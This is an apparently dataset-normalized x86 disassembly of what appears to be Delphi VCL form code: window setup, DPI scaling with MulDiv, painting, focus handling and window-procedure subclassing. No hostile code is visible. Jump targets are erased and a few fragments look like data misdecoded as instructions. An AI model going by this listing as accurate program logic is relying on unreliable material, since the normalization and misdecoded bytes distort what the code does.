mov dl 0x1
mov eax [ r-xdata ]
call sub_422e14
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_457b40
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cfb0
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_43caa0
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_4031b4
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_457ea4
xor edx edx
mov eax ebx
call sub_43e088
xor edx edx
mov eax ebx
call sub_43dff0
mov dl 0x1
mov eax ebx
call sub_444838
mov edx ebx
mov eax [ rw-data ]
call sub_45c508
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_45739d
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_419620
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_413b0c
xor edx edx
mov eax ebx
call sub_4165a4
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_45b3b0
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_457408
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035f8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_4574d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_459d2c
mov eax [ ebp - 0x4 ]
call sub_4449fc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45c540
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_40326c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_40326c
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40cd80
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_4567b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4574d9
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_4574ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push j_sub_40370c#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_457ea4
sub_457532
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_403468
test al al
jne r-xdata
call sub_403a74
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_403a20
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_457ea4
sub_457568
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push j_sub_40370c#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4575c8
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43ffcc
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_403468
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_459870
sub_457604
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43d394
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_41386c
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_458c68
mov edx esi
mov eax ebp
call sub_413b0c
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_458c40
mov edx esi
mov eax edi
call sub_458c68
jmp r-xdata
xor edx edx
mov eax edi
call sub_458c1c
sub_457710
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_440f90
xor edx edx
push ebp
push sub_457966
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4406ec
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43d8e0
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43d924
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_457a98
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_43f0c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45796d
mov eax [ ebp - 0x4 ]
call sub_440f98
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_456c78
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4441bc
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_456c78
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4441bc
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_41c874
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_41c87c
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_457975
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441a38
push 0x0
push 0x0
push ebx
push sub_457a7c
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_457a48
push ebx
push sub_457a60
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_457a27
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_416c9c
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_43dff0
sub_457ab3
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_456c78
mov ecx edi
mov edx esi
mov eax ebx
call sub_4441bc
mov eax ebx
call sub_457b9c
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_41c918
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_41c934
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_43d90c
mov ebp eax
push edi
push esi
mov eax ebx
call sub_43d8c8
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_457e44
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_457e74
sub_457b40
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_4446f8
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_4449fc
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_457b58
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ebx
retn
mov eax ebx
call sub_459ea0
push eax
push 0x1
push 0x80
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
pop ebx
retn
sub_457bd4
push ebx
mov ebx eax
mov eax ebx
call sub_458af0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_457c68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4446f8
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_4447c0
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_4446f8
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_4446f8
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_457cf0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_444c9c
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_4199a4
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_419978
mov edi eax
mov eax edi
mov si 0xfff1
call sub_403468
test al al
jne r-xdata
sub_457d5c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_4031b4
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_457d88
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax ebp
call sub_441428
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_4199a4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_444ce4
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_419978
mov si 0xfff1
call sub_403468
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_4199b4
jmp r-xdata
sub_457e1c
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_43e0ac
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43f0c4
sub_457e44
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_43d8e0
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_457e74
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_43d924
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_457ea4
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_43dde4
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_458fdc
pop esi
pop ebx
retn
sub_457ee8
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_457f41
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457f48
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
sub_457f50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_43dd98
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_441c50
mov eax ebx
call sub_441dec
sub_457f88
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4197f0
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_457fc8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44210c
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403468
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_403468
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_43f0c4
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_43f0c4
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_43f0c4
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_43f0c4
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_43f0c4
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_43f0c4
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_451668
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4588f4
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cfb0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_458241
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_458224
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41d6a8
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41d548
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_452b50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45822b
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41d6a8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_451668
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4588f4
call sub_4446f8
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45836f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cfb0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_458348
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45832b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41d6a8
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41d548
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458332
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41d6a8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_4446f8
mov esi eax
sub_45834f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call ReleaseDC
retn
sub_458400
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_45844c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_458928
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_458974
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_45848c
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_45865a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41ce94
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4423ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_43da08
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
